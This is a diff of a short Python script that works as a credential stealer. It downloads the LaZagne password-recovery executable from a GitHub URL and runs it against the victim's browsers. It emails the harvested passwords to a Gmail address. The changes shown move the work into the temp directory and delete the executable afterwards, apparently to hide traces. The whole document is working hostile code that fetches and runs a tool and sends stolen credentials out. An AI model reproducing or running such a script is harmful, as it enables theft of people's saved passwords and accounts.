@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import requests
-import subprocess, smtplib, re
+import subprocess, smtplib, re, os, tempfile
 
 
 def download(url):
@@ -21,9 +21,12 @@ def send_email(email, password, message):
     server.quit()
 
 
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
+print(temp_directory)
 download("https://github.com/Hokagenaruto123456/Lazagne123456/raw/master/laZagne_x86.exe")
-lazagne_output = subprocess.check_output("laZagne_x64.exe all", shell=True)
-send_email("test@gmail.com", "testtesttest.", lazagne_output)
-
+lazagne_output = subprocess.check_output("laZagne_x86.exe browsers", shell=True)
+send_email("test@gmail.com", "testpassword", lazagne_output)
+os.remove("laZagne_x86.exe")
 # C:\Python27\python.exe -m pip install requests
 
